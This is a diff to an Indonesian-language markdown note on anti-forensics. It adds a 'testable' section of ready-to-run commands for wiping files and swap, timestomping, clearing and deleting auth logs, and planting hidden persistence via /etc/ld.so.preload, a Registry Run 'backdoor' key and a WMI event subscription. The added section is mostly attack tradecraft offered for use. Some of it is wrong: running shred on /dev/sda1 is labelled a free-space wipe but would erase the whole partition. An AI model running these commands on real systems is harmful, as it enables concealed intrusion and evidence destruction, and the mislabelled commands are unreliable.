@@ -97,6 +97,58 @@ Operation done / detect risk
 ## 5. Referensi
 - sdelete — https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete
 - Volatility 3 — https://github.com/volatilityfoundation/volatility3
-- KAPE — https://www.kroll.com/en/services/cyber-risk/...
 - Anti-Forensics — https://www.sciencedirect.com/topics/computer-science/anti-forensics
 - The Sleuth Kit — https://www.sleuthkit.org/
+
+## Konkret — Anti-Forensics (Testable)
+
+### File Wipe & Overwrite
+
+```bash
+# 1. Overwrite file dengan random data (7 pass = DOD 5220.22-M)
+shred -vfz -n 7 /path/file
+# -v verbose, -f force, -z zero last pass
+
+# 2. Free space wipe
+shred -n 7 /dev/sda1   # CAUTION: wipe semua free space
+
+# 3. Hapus metadata + timeline (timestomp)
+# Linux: touch -d "2020-01-01 00:00:00" file
+# Windows (timestomp.exe):
+timestomp.exe file -m "01/01/2020 00:00:00" -a "01/01/2020" -c "01/01/2020"
+
+# 4. Log cleaning
+echo "" > /var/log/auth.log        # kosongkan tapi file ada
+rm -f /var/log/auth.log            # hapus total (mencurigakan)
+```
+
+### Memory Anti-Forensics
+
+```bash
+# Hapus dari /proc/meminfo / /proc/kcore visible
+# Overwrite buffer di RAM sebelum shutdown
+# Defense: anti-forensics tool (e.g. MEMORY ZERO)
+
+# Swap wipe
+swapoff /dev/sda2 && dd if=/dev/zero of=/dev/sda2 bs=1M
+```
+
+### Hidden Persistence
+
+```bash
+# 1. Linux: /etc/ld.so.preload (lib hook)
+echo "/tmp/libevil.so" > /etc/ld.so.preload
+
+# 2. Windows: Registry Run key
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\path\evil.exe"
+
+# 3. WMI Event Subscription (persistence + stealth)
+wmic /namespace:\\root\subscription create __EventFilter name=Evil, EventNamespace='root\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name=\"cmd.exe\"'
+
+# 4. Bootkit / UEFI (deepest persistence)
+# firmware rootkit → survive reinstall
+```
+---
+
+audited
+---
